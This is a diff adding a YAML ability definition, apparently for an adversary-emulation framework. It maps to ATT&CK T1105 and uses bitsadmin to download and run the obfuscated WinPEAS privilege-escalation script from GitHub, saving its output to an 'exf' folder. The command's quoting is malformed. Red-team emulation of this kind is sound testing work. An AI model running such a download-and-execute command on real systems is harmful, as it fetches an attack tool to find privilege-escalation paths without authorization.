@@ -1,0 +1,24 @@
+- name: Donwload WinPEAS
+  description: This ability donwloads the latest version of obfuscated Windows Privilege Escalation Awesome Script from GitHUB and runs it. 
+    bigtsadmin
+  tactic: command-and-control
+  technique_id: T1105
+  technique_name: Ingress Tool Transfer
+  executors:
+  - payloads: []
+    platform: windows
+    name: psh
+    cleanup: []
+    parsers: []
+    command: "bitsadmin /transfer DownloadsWinPEAS /download /priority normal "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe $env:PUBLIC\Toolz\winPEASany_ofs.exe;
+$env:PUBLIC\Toolz\winPEASany_ofs.exe | Out-File -Encoding ASCII $env:PUBLIC\exf\winPEAS.txt"
+    timeout: '60'
+  repeatable: false
+  additional_info: {}
+  privilege: ''
+  singleton: true
+  buckets: []
+  requirements: []
+  access: {}
+  cleanup: []
+  id: WinPEAS_downlad_and_run
